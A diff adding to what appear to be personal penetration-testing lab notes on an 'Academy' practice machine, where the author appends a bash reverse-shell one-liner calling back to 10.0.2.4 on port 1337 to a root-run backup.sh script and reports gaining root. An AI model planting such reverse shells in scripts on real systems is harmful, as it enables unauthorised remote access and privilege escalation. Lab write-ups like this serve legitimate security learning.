@@ -1855,3 +1855,25 @@ rm /tmp/backup.zip
 zip -r /tmp/backup.zip /var/www/html/academy/includes
 chmod 700 /tmp/backup.zip
 ```
+	
+- seems like it makes a backup of a file. lets see if it actually has execution perms or not 
+```sh
+grimmie@academy:~$ ls -l 
+total 4
+-rwxr-xr-- 1 grimmie administrator 112 May 30  2021 backup.sh
+```
+	
+- lets paste in a one liner bash shell in here and see what happens. gonna use the [[pentestMonkey-oneLinerBashShell]] :3 
+- added the bash one liner and listening on port `1337` with [[netcat]] 
+```sh
+grimmie@academy:~$ cat backup.sh 
+#!/bin/bash
+
+rm /tmp/backup.zip
+zip -r /tmp/backup.zip /var/www/html/academy/includes
+chmod 700 /tmp/backup.zip
+bash -i >& /dev/tcp/10.0.2.4/1337 0>&1
+```
+
+- WE GOT ROOOOOOOOOOOOTTTTTTTTTT
+![[AcademyHasBeenRooted.png]] 
